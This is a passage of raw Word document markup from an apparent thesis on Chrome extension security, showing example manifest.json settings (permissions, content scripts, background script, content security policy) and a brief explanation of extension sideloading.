                        </w:rPr>
                        <w:t>"web_accessible_resources"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">: </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>[</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"images/*.png "</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>,</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"style/double-rainbow.css"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>,</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"scripts/double-rainbow.js"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>,</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"script/main.js"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>,</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"templates/*"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>]</w:t>
                      </w:r>
                      <w:r w:rsidRPr="002522AF">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                        <w:t>}</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="3A57767E" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="002522AF" w:rsidRDefault="006A6E3D" w:rsidP="002522AF">
                      <w:pPr>
                        <w:pStyle w:val="HTMLPreformatted"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="0004E27D" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="002522AF" w:rsidRDefault="006A6E3D" w:rsidP="005265FC">
                      <w:pPr>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="page" anchory="page"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="39C92266" w14:textId="4F48ED67" w:rsidR="00C4207C" w:rsidRDefault="00D85714" w:rsidP="00FF5D68">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251654144" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="5DA50B8A" wp14:editId="28F6C6A8">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>2157730</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>3121660</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="2649220" cy="3714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2649220" cy="371475"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:prstClr val="white"/>
                        </a:solidFill>
                        <a:ln>
                          <a:noFill/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="02CC4681" w14:textId="18B8394B" w:rsidR="006A6E3D" w:rsidRPr="00813B58" w:rsidRDefault="006A6E3D" w:rsidP="002522AF">
                            <w:pPr>
                              <w:pStyle w:val="Caption"/>
                              <w:jc w:val="center"/>
                              <w:rPr>
                                <w:noProof/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                            </w:pPr>
                            <w:bookmarkStart w:id="69" w:name="_Toc523071573"/>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w:t>
                            </w:r>
                            <w:r w:rsidRPr="00304621">
                              <w:t>manifest.json file.</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27" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:169.9pt;margin-top:245.8pt;width:208.6pt;height:29.25pt;z-index:25165414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" stroked="f">
                <v:textbox style="mso-fit-shape-to-text:t" inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="02CC4681" w14:textId="18B8394B" w:rsidR="006A6E3D" w:rsidRPr="00813B58" w:rsidRDefault="006A6E3D" w:rsidP="002522AF">
                      <w:pPr>
                        <w:pStyle w:val="Caption"/>
                        <w:jc w:val="center"/>
                        <w:rPr>
                          <w:noProof/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                      </w:pPr>
                      <w:bookmarkStart w:id="70" w:name="_Toc523071573"/>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w:t>
                      </w:r>
                      <w:r w:rsidRPr="00304621">
                        <w:t>manifest.json file.</w:t>
                      </w:r>
                      <w:bookmarkEnd w:id="70"/>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="page"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="48A1E260" w14:textId="77777777" w:rsidR="005B52FE" w:rsidDel="00D737C4" w:rsidRDefault="005B52FE" w:rsidP="00543991">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:del w:id="71" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:32:00Z"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26B02A40" w14:textId="77777777" w:rsidR="005B52FE" w:rsidRDefault="005B52FE" w:rsidP="00543991">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A92BF14" w14:textId="5780A137" w:rsidR="005B52FE" w:rsidRDefault="005B52FE" w:rsidP="005B52FE">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="72" w:name="_Toc523071493"/>
      <w:r>
        <w:t>Installing Extensions</w:t>
      </w:r>
      <w:bookmarkEnd w:id="72"/>
    </w:p>
    <w:p w14:paraId="59650B2C" w14:textId="4F51A779" w:rsidR="0097075E" w:rsidRDefault="00EC4BCB" w:rsidP="00543991">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>The Chrome Web Store is the official means for users to find and install extensions. But in addition to this, extensions can also be installed manually by the user or an external program. Installation of extensions outside the web store is referred as sideloading. In 2014 Chrome took steps to prevent sideloading by requiring all installed extensions to be hosted in the Chrome Web Store. However, it is still possible for programs to force silent installation of extensions, since the attacker already has control of the machine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="146A8582" w14:textId="77777777" w:rsidR="00941EAC" w:rsidRDefault="00941EAC" w:rsidP="00543991">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55907CA1" w14:textId="77777777" w:rsidR="00FF5D68" w:rsidRPr="00CB1634" w:rsidRDefault="00FF5D68" w:rsidP="00543991">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="230A135E" w14:textId="58B1DF42" w:rsidR="00D16E5F" w:rsidRPr="000918EC" w:rsidRDefault="00A730F4" w:rsidP="00925228">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="73" w:name="_Toc523071494"/>
      <w:bookmarkEnd w:id="68"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Access Control Settings</w:t>
      </w:r>
      <w:bookmarkEnd w:id="73"/>
    </w:p>
    <w:bookmarkStart w:id="74" w:name="_Toc219883676"/>
    <w:bookmarkStart w:id="75" w:name="_Toc220232050"/>
    <w:bookmarkStart w:id="76" w:name="_Toc225155172"/>
    <w:bookmarkStart w:id="77" w:name="_Toc225155311"/>
    <w:p w14:paraId="04135050" w14:textId="560136C2" w:rsidR="002522AF" w:rsidRDefault="002522AF" w:rsidP="002522AF">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251664384" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="4C3E3F57" wp14:editId="5F4E6154">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>1118870</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>4503420</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3524250" cy="5334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3524250" cy="533400"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:prstClr val="white"/>
                        </a:solidFill>
                        <a:ln>
                          <a:noFill/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="0F528A66" w14:textId="1A1EA0B2" w:rsidR="006A6E3D" w:rsidRPr="00C4117F" w:rsidRDefault="006A6E3D" w:rsidP="00240F05">
                            <w:pPr>
                              <w:pStyle w:val="Caption"/>
                              <w:jc w:val="left"/>
                            </w:pPr>
                            <w:bookmarkStart w:id="78" w:name="_Toc523071574"/>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Start w:id="79" w:name="_Hlk514841428"/>
                            <w:r>
                              <w:t>: Example of manifest containing API permissions, content scripts, background script and CSP</w:t>
                            </w:r>
                            <w:bookmarkEnd w:id="79"/>
                            <w:r>
                              <w:t>.</w:t>
                            </w:r>
                            <w:bookmarkEnd w:id="78"/>
                          </w:p>
                          <w:p w14:paraId="49C8B888" w14:textId="2109C836" w:rsidR="006A6E3D" w:rsidRPr="00A8401A" w:rsidRDefault="006A6E3D" w:rsidP="00240F05">
                            <w:pPr>
                              <w:pStyle w:val="Caption"/>
                              <w:jc w:val="left"/>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3E3F57" id="Text Box 22" o:spid="_x0000_s1028" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:88.1pt;margin-top:354.6pt;width:277.5pt;height:4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" stroked="f">
                <v:textbox inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="0F528A66" w14:textId="1A1EA0B2" w:rsidR="006A6E3D" w:rsidRPr="00C4117F" w:rsidRDefault="006A6E3D" w:rsidP="00240F05">
                      <w:pPr>
                        <w:pStyle w:val="Caption"/>
                        <w:jc w:val="left"/>
                      </w:pPr>
                      <w:bookmarkStart w:id="32" w:name="_Toc523071574"/>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Start w:id="33" w:name="_Hlk514841428"/>
                      <w:r>
                        <w:t>: Example of manifest containing API permissions, content scripts, background script and CSP</w:t>
                      </w:r>
                      <w:bookmarkEnd w:id="33"/>
                      <w:r>
                        <w:t>.</w:t>
                      </w:r>
                      <w:bookmarkEnd w:id="32"/>
                    </w:p>
                    <w:p w14:paraId="49C8B888" w14:textId="2109C836" w:rsidR="006A6E3D" w:rsidRPr="00A8401A" w:rsidRDefault="006A6E3D" w:rsidP="00240F05">
                      <w:pPr>
                        <w:pStyle w:val="Caption"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:noProof/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251658240" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="32F5182B" wp14:editId="56F62C13">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>1033145</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="page">
                  <wp:posOffset>1638300</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3848100" cy="3838575"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>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0" cy="3838575"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="15793C31" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRDefault="006A6E3D" w:rsidP="002522AF">
                            <w:pPr>
                              <w:pStyle w:val="HTMLPreformatted"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>{</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                              <w:t>…</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t xml:space="preserve">  </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"permissions"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">: </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>[</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t xml:space="preserve">  </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"cookies"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>,</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t xml:space="preserve">  </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"webRequest"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>,</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t xml:space="preserve">  </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"*://*.facebook.com/"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>,</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t xml:space="preserve">  </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"https://www.google.com/"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>]</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>,</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>…</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"content_scripts"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">: </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>[</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t xml:space="preserve">  </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>{</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"matches"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">: </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>[</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"http://www.yahoo.com/*"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>]</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>,</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"js"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">: </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>[</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"jquery.js"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">, </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"myscript.js"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>]</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t xml:space="preserve">  </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>}</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                              <w:t>]</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>,</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>…</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"background"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">: </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>{</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t xml:space="preserve">  </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"scripts"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">: </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>[</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"background.js"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>]</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                              <w:t>}</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>,</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>…</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"content_security_policy"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">: </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t xml:space="preserve">"script-src </w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="39B55298" w14:textId="2ECC4BDA" w:rsidR="006A6E3D" w:rsidRDefault="006A6E3D" w:rsidP="002522AF">
                            <w:pPr>
                              <w:pStyle w:val="HTMLPreformatted"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>‘self’</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> </w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>http</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>:</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="808080"/>
                              </w:rPr>
                              <w:t>//www.foo.com ‘unsafe-eval’;"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="808080"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>…</w:t>
                            </w:r>
                            <w:r w:rsidRPr="002522AF">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
